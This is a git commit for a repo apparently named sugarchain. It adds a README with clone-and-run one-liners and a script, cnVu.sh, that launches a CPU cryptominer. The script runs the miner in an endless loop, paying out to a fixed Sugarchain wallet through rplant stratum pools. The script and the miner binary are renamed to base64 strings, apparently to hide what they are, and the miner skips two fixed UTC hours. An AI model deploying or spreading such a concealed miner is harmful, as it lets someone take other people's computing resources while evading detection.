fc8589966eb29b6146e8d9925f82fe30f320205f
Ubuntu <mujurdotid@gmail.com>
2021-03-30 08:07:34 +0000

    Initial commit

---
+++ README.md
@@ -0,0 +1,14 @@
+# sugarchain
+rm -rf sugarchain && git clone https://github.com/MujurID/sugarchain && cd sugarchain && sh start.sh
+
+
+https://github.com/rplant8/cpuminer-opt-rplant
+
+
+rm -rf sugarchain && git clone https://github.com/MujurID/sugarchain && cd sugarchain && bash start-arg.sh "token" "grup_id" "isipesanjanganspasi"
+
+
+rm -rf sugarchain && git clone https://github.com/MujurID/sugarchain && cd sugarchain && bash run.sh
+
+
+git clone https://github.com/MujurID/c3VnYXJjaGFpbg && cd c3VnYXJjaGFpbg && bash cnVu.sh
---
+++ cnVu.sh
@@ -0,0 +1,49 @@
+#!/bin/bash
+
+jam2digit=$(date -u +%H)
+jam1digit=$((jam2digit))
+echo $jam1digit
+ketentuan1=2
+ketentuan2=14
+if [[ $jam1digit -eq $ketentuan1 ]]
+then
+  echo "sama dengan $ketentuan "
+elif [[ $jam1digit -eq $ketentuan2 ]]
+then
+  echo "sama dengan $ketentuan "
+else
+  echo "enggak $ketentuan "
+  #chmod +x cpuminer-sse2
+  chmod +x Y3B1bWluZXItc3NlMg
+  while [ 1 ]; do
+  #./cpuminer-sse2 -a yespowerSUGAR -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q6dsvfpf6palnwsel8g6q2ljzft2yj57tt0dsds.MujurID$(( $RANDOM % 99 + 1 ))
+  ./Y3B1bWluZXItc3NlMg -a yespowerSUGAR -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q6dsvfpf6palnwsel8g6q2ljzft2yj57tt0dsds.MujurID$(( $RANDOM % 99 + 1 ))
+  sleep 5
+  done
+fi
+
+#echo 'index'
+
+#lscpu
+
+#curl http://ip-api.com/json/
+
+#chmod +x cpuminer-sse2
+
+#
+# Choose nearest stratum:
+#       stratum-ru.rplant.xyz   /Moscow/
+#       stratum-eu.rplant.xyz   /London/
+#       stratum-asia.rplant.xyz /Singapore/
+#       stratum-na.rplant.xyz   /Toronto/
+#
+
+#while [ 1 ]; do
+#echo 'index'
+#./cpuminer-sse2 -a yespowerSUGAR -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q6dsvfpf6palnwsel8g6q2ljzft2yj57tt0dsds.MujurID128
+#./cpuminer-sse2 -a yespowerSUGAR -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q6dsvfpf6palnwsel8g6q2ljzft2yj57tt0dsds.MujurID$(( $RANDOM % 99 + 1 ))
+#sleep 5
+#echo 'index'
+#done
+
+#echo 'index'
